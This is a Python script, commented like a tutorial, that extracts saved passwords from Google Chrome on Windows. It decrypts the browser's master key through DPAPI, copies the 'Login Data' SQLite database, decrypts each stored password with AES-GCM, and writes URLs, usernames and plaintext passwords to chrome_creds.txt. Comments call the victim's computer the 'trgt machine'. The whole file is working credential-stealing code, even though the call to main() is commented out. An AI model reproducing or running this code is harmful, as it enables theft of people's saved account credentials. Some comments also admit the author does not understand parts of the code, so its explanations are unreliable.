#!/usr/bin/python3

import os     # Library provides a portable way of using
	      # operating system-dependent functionality

import json   # The process of encoding JSON is usually
	      # called serialization. This term refers
              # the transformation of data into a series
              # of bytes (hence serial) to be stored or
              # transmitted across a network.

import base64 # Base64 encoding is used to convert bytes
	      # that have binary or text data into
              # ASCII characters


from Crypto.Cipher import AES # python Cryptographic module

import shutil     # This module helps in automating process of
	          # copying and removal of files and directories

import sqlite3    # SQLite3 can be integrated with Python using sqlite3 module

from datetime import datetime, timedelta # all the functions are explained
			                 # at particular line where they
                                         # are being used



# Converting Chrome timestamps to human-readable date
def chrome_datetime(chrome_date):

	# datetime.datetime is a combination of a date and a time. 
	# It has all the attributes of both classes.

	# Format: datetime.datetime(year, month, day, hour=0, minute=0, 
	#                           second=0, microsecond=0, tzinfo=None,
	#                           *, fold=0)

	# For reference: https://www.epochconverter.com/webkit

	start = datetime(year=1601,month=1,day=1)


	# datetime.timedelta represents a duration, 
	# the difference between two dates or times.

	# Format: datetime.timedelta(days=0, seconds=0, microseconds=0, 
	#                            milliseconds=0, minutes=0, 
	#                            hours=0, weeks=0)


	delta = timedelta(microseconds=int(chrome_date))

	return start + delta # For password creation/addition date 
		             # and last used date in chrome



def encryption_key():


	# An interface to the win32 Cryptography API
	import win32crypt			      # I took imported here to avoid error if trgt machine is linux:
	                                              # ModuleNotFoundError: No module named 'win32crypt'


	# For chrome in windows, decryption key can be found in
	# C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Local State path
	# with AES encryption and file type will be JSON, though it will not have any extension

	path = r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ["USERPROFILE"])

	with open(path, "r", encoding='utf-8') as file:

		data = file.read()
		data = json.loads(data)


	# decode the encryption key from Base64
	prv_key = base64.b64decode(data['os_crypt']['encrypted_key'])

	# To analyse manually:

	# If we analyse "Local State" file in a text editor, we would get
	# os_crypt and encrypted_key with a passphrase which is encrypted.

	# While testing, I manually copied the passphrase and applied regex with an
	# intent of it being base64 encoding as all the letters where among
	# A-Z,a-z,0-9,=,/

	# In sublime text, used: regex option to find: [a-z,A-Z,0-9,+,/]

	# More about base64:
	# https://medium.com/swlh/powering-the-internet-with-base64-d823ec5df747

	# All of the characters were matched. Thus it is base64 encoding.

	# I went to cyberchef and decoded it with base64...

	# I got a string named: DPAPI in fromt of all the gibberish stuff.
	# Then, I went up to google to search for DPAPI (Data Protection API)

	# For reference see: 
	# https://en.wikipedia.org/wiki/Data_Protection_API

	# Removing DPAPI string from result that we got after decoding it with base64
	prv_key = prv_key[5:]

	# key decryption from DPAPI
	prv_key = win32crypt.CryptUnprotectData(prv_key, None, None, None, 0)[1]

	# For reference: 
	# https://yiyibooks.cn/__src__/meikunyuan6/pywin32/pywin32/PyWin32/win32crypt.html

	# Why did 'CryptUnprotectData' is used ?
	# Chrome utilizes a Windows function called CryptProtectData 
	# to encrypt passwords stored on computers with a randomly 
	# generated key

	# For reference: 
	# https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata?redirectedfrom=MSDN

	# Returning key after decryption from DPAPI
	return prv_key

# Decrypting AES and password
def d_passwd(passwd, key):

	# An interface to the win32 Cryptography API
	import win32crypt                                    # I took imported here to avoid error if trgt machine is linux: 
	                                                     # ModuleNotFoundError: No module named 'win32crypt'

	try:
		# Actually I didn't get this portion
		# I found this here:

		# https://stackoverflow.com/questions/61099492/chrome-80-password-file-decryption-in-python

		# To clarify the concept of this line
		# I only got this link but still unable to get it:

		# http://bit.ly/3c3hLLd

		iv = passwd[3:15] # nonce = iv

		passwd = passwd[15:]

		# Generating cipher to decrypt AES
		# Chrome uses AES-256

		# see: https://cloud.google.com/security/encryption-at-rest/default-encryption

		# Actually those links were way too big, that is why...

		# To check legitimacy of the link, use: http://bit.ly/3c3hLLd+

		cipher = AES.new(key, AES.MODE_GCM, iv)
		# All mordern technologies uses GCM of operation for
		# But haven't got yet whether google uses GCM or not

		# decrypting the password
		d_passwd = cipher.decrypt(passwd)[:-16].decode()   # Removing suffix bytes

		return d_passwd

	except:

		try:

			return str(win32crypt.CryptUnprotectData(passwd, None, None, None, 0)[1])

		except:

			return 

def main():

	# getting DPAPI decrypted key but still AES is left
	prv_key = encryption_key()

	# We got the key : Now the path of the database where password is stored

	# For chrome in windows, password database file can be found in 
	# C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data
	# path

	db_path = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ["USERPROFILE"])

	# We can't open it with text editor(properly), as it is a .db file in 
	# SQLite format 3. 

	# How do I know that it is in SQLite format 3 ?
	# If I open it in text editor(any), we can see only : 'SQLite format 3'
	# as human readable format, others are gibberish stuff

	# To open it , we can use SQLite Database Browser or SQLite Maestro but
	# if chrome is currently running, we can't open it, it will be locked. 

	# Either, we have to turn off the running chrome and access it
	# or we have to make a copy of it and then open in another directory.

	# For more: 
	# https://superuser.com/questions/146742/how-does-google-chrome-store-passwords#:~:text=The%20passwords%20are%20encrypted%20and,API%20function%20for%20encrypting%20data

	# Now, we can open and play around with the database, after sometime, we can see
	# 'logins' table has the username and password element 

	# For this code, we will copy the file to another directory to avoid confusion

	pwd = os.getcwd()

	file = pwd  + "\Chrome_pass.db"
	shutil.copyfile(db_path, file)

	# Connecting to sqlite database
	conn = sqlite3.connect(file)

	# Creating a cursor object to invoke methods that execute SQLite statements
	# For more:
	# https://www.tutorialspoint.com/python_data_access/python_sqlite_cursor_object.htm
	cursor = conn.cursor()

	# We are gonna needing these data only
	cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

	for i in cursor.fetchall():

		origin_url = i[0]  # The website link the trgt visited for the 1st time when they made their account and saved their passwords
		action_url = i[1]  # The website link they visited after making the account where password gets autofilled/useraccount option pops up, waiting to be clicked by user

		username = i[2]

		# getting passwd after decrypting encrypted pass with prv_key
		passwd = d_passwd(i[3], prv_key)

		# Date when password was created
		date_created = i[4]

		# Date when password was last used
		date_last_used = i[5]


		with open("chrome_creds.txt", 'a+') as f:

			# For those links which have username or password
			if username or passwd:

				line = "-"*50
				line = line+"\n"
				f.write(line)

				o_url = f"Origin URL: {origin_url}\n"
				f.writelines(o_url)

				a_url = f"Action URL: {action_url}\n"
				f.writelines(a_url)

				user = f"Username: {username}\n"
				f.writelines(user)

				password = f"Password: {passwd}\n"
				f.writelines(password)


				if date_created:

					d_created = f"Password Creation date: {str(chrome_datetime(date_created))}\n"
					f.writelines(d_created)

				if date_last_used:

					d_last_used = f"Last Used: {str(chrome_datetime(date_last_used))}\n"
					f.writelines(d_last_used)

				line = "-"*50
				line = line+"\n"
				f.write(line)


			else:

				continue


	# Closing connection from database
	conn.close()

	# Removing copied database
	os.remove(file)


#if __name__ == "__main__":

#	main()

